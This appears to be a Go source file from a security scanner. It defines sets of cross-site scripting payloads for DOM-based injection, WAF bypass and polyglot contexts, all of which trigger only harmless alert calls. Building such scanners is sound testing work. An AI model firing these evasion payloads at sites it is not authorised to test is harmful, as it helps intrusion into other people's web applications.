package scanner

// PayloadSet represents a group of XSS payloads tuned for a specific context.
type PayloadSet struct {
	Name     string
	Payloads []string
	Context  string
}

// AdvancedPayloads extends the basic payloads with more aggressive variants.
// These are inspired by common DOM XSS, WAF bypass, and polyglot techniques.
var AdvancedPayloads = []PayloadSet{
	{
		Name: "DOM-based XSS",
		Payloads: []string{
			"#<img src=x onerror=alert(1)>",
			"#';alert(String.fromCharCode(88,83,83))//",
			"javascript:/*--></title></style></textarea></script></xmp>*/alert(1)//",
		},
		Context: "fragment",
	},
	{
		Name: "WAF Bypass",
		Payloads: []string{
			"<svg/onload=alert(1)>",
			"<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'>",
			"<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", // Base64: alert(1)
			"<<SCRIPT>alert(1);//<</SCRIPT>",
			"<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
		},
		Context: "encoded",
	},
	{
		Name: "Polyglot",
		Payloads: []string{
			"jaVasCript:/*-/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><svg/onload=alert(1)>",
		},
		Context: "polyglot",
	},
}
